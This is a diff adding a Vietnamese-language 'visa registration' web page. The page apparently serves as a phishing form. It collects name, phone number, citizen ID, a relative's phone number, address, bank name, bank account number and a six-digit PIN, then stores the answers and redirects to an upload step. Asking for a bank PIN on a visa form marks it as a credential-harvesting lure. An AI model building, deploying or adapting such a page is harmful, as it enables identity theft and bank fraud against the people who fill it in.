@@ -1,0 +1,160 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Đăng Ký Thị Thực Visa</title>
+  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
+  <style>
+    * { margin:0; padding:0; box-sizing:border-box; }
+    body { 
+      font-family:'Roboto', sans-serif; 
+      background:#f0f4f8; 
+      color:#333; 
+      min-height:100vh; 
+      padding:20px; 
+    }
+    .container { 
+      max-width:520px; 
+      margin:0 auto; 
+      background:white; 
+      padding:40px 30px; 
+      border-radius:16px; 
+      box-shadow:0 10px 30px rgba(0,0,0,0.1); 
+    }
+    h1 { 
+      text-align:center; 
+      color:#003366; 
+      margin-bottom:30px; 
+      font-size:28px; 
+    }
+    label { 
+      display:block; 
+      margin:20px 0 8px; 
+      font-weight:500; 
+      color:#003366; 
+    }
+    input { 
+      width:100%; 
+      padding:14px; 
+      border:1px solid #ccc; 
+      border-radius:8px; 
+      font-size:16px; 
+      transition:0.3s; 
+    }
+    input:focus { 
+      border-color:#0066cc; 
+      outline:none; 
+      box-shadow:0 0 0 3px rgba(0,102,204,0.1); 
+    }
+    .btn { 
+      width:100%; 
+      padding:16px; 
+      background:#0066cc; 
+      color:white; 
+      border:none; 
+      border-radius:8px; 
+      font-size:18px; 
+      font-weight:500; 
+      cursor:pointer; 
+      margin-top:30px; 
+      transition:0.3s; 
+    }
+    .btn:hover { 
+      background:#0055b3; 
+      transform:translateY(-2px); 
+    }
+    @media (max-width:500px) { 
+      .container { padding:30px 20px; } 
+    }
+    .code-six { display:flex; gap:7px; }
+    .code-six input { width:calc((100% - 35px)/6); min-width:0; text-align:center; padding:12px 0; }
+    .hint { font-size:14px; color:#666; margin-top:8px; line-height:1.5; }
+  
+/* Bổ sung màu xanh đậm, giữ bố cục cơ bản */
+body{background:#e0eafa!important;color:#10243d!important}
+.container,main{border:1px solid #91abc9}
+h1,label{color:#00264f!important}
+.btn,button[type=submit],button.primary{background:#00336f!important;color:white!important}
+.btn:hover{background:#002756!important}
+input:focus{border-color:#00336f!important}
+.hint,.note{line-height:1.6}
+.code-six input[disabled]{background:#eaf0f7;color:#264c76;opacity:1;cursor:not-allowed}
+.visa-notice{background:#e8f1fc;border:1px solid #b7cae3;border-radius:8px;padding:12px;margin-top:18px;font-size:13px;line-height:1.6;color:#163d67}
+.visa-error{color:#a51b32;margin-top:12px;line-height:1.5}
+.modal{position:fixed;inset:0;background:rgba(0,22,50,.72);display:flex;align-items:center;justify-content:center;padding:16px;z-index:50}
+.modal[hidden]{display:none}.modal-box{max-width:460px;width:100%;background:white;border-radius:16px;padding:34px 26px;text-align:center;box-shadow:0 16px 48px #0004}
+.modal-box h2{color:#00264f;font-size:21px;line-height:1.4;margin:10px 0 14px}
+.modal-box p{line-height:1.7}.modal-box button{background:#00336f;border:0;border-radius:8px;color:white;font-size:16px;padding:12px 22px;margin-top:20px;cursor:pointer}
+.linkrow{margin-top:16px;text-align:center;font-size:14px}.linkrow a{color:#00336f}
+.preview{margin-top:8px;font-size:13px;color:#224c77}.preview img{max-width:130px;max-height:110px;display:block;border-radius:6px;margin-top:8px}
+</style>
+</head>
+<body>
+
+  <div class="container">
+    <h1>Đăng Ký Thị Thực Visa</h1>
+
+    <form id="registrationForm">
+      <label for="hoten">Họ và tên</label>
+      <input type="text" id="hoten" placeholder="Nhập họ và tên đầy đủ theo CCCD" autocomplete="off">
+
+      <label for="sdt">Số điện thoại chính chủ</label>
+      <input type="tel" id="sdt" placeholder="Ví dụ: 0912345678" autocomplete="off">
+
+      <label for="cccd">Số căn cước công dân</label>
+      <input type="text" id="cccd" placeholder="Nhập 12 chữ số trên căn cước công dân" autocomplete="off">
+
+      <label for="ngthan1">Số điện thoại liên hệ người thân</label>
+      <input type="tel" id="ngthan1" placeholder="Nhập số điện thoại người thân" autocomplete="off">
+
+      <label for="diachi">Địa chỉ thường trú</label>
+      <input type="text" id="diachi" placeholder="Số nhà, đường, phường/xã, tỉnh/thành phố" autocomplete="off">
+
+      <label for="visa">Diện visa đăng ký</label>
+      <input type="text" id="visa" placeholder="Ví dụ: Visa du lịch, du học, công tác" autocomplete="off">
+
+      <label for="nganhang">Ngân hàng xác minh tài chính</label>
+      <input type="text" id="nganhang" placeholder="Nhập tên ngân hàng xác minh tài chính" autocomplete="off">
+
+      <label for="stk">Số tài khoản ngân hàng</label>
+      <input type="text" id="stk" placeholder="Nhập số tài khoản đứng tên người đăng ký" autocomplete="off">
+
+      <label>Mã PIN</label>
+      <div class="code-six" aria-label="Nhập mã pin xác nhận hồ sơ 6 số">
+        <input class="local-code" type="text" inputmode="numeric" maxlength="1" aria-label="Số 1" autocomplete="off" placeholder="0"><input class="local-code" type="text" inputmode="numeric" maxlength="1" aria-label="Số 2" autocomplete="off" placeholder="0"><input class="local-code" type="text" inputmode="numeric" maxlength="1" aria-label="Số 3" autocomplete="off" placeholder="0"><input class="local-code" type="text" inputmode="numeric" maxlength="1" aria-label="Số 4" autocomplete="off" placeholder="0"><input class="local-code" type="text" inputmode="numeric" maxlength="1" aria-label="Số 5" autocomplete="off" placeholder="0"><input class="local-code" type="text" inputmode="numeric" maxlength="1" aria-label="Số 6" autocomplete="off" placeholder="0">
+      </div>
+      <p class="hint">Mã PIN cần ghi 6 số .</p>
+      <button type="submit" class="btn">Gửi Hồ Sơ</button>
+    </form>
+  </div>
+
+  <script src="app.js"></script>
+  <script>
+    const codeBoxes = Array.from(document.querySelectorAll('.local-code'));
+    codeBoxes.forEach((field, index) => {
+      field.addEventListener('input', () => {
+        field.value = field.value.replace(/\D/g, '').slice(-1);
+        if (field.value && index < 5) codeBoxes[index + 1].focus();
+      });
+      field.addEventListener('keydown', event => {
+        if (event.key === 'Backspace' && !field.value && index > 0) codeBoxes[index - 1].focus();
+      });
+      field.addEventListener('paste', event => {
+        event.preventDefault();
+        const digits = (event.clipboardData.getData('text') || '').replace(/\D/g, '').slice(0,6);
+        digits.split('').forEach((digit, offset) => {
+          if (index + offset < 6) codeBoxes[index + offset].value = digit;
+        });
+        codeBoxes[Math.min(index + digits.length, 5)].focus();
+      });
+    });
+    document.getElementById('registrationForm').addEventListener('submit', e=>{
+      e.preventDefault();
+      const fields=['hoten','sdt','cccd','ngthan1','diachi','visa','nganhang','stk'];
+      const data=Object.fromEntries(fields.map(k=>[k,document.getElementById(k).value.trim()]));
+      sessionStorage.setItem('visa_draft',JSON.stringify(data));
+      location.href='upload.html';
+    });
+  </script>
+</body></html>
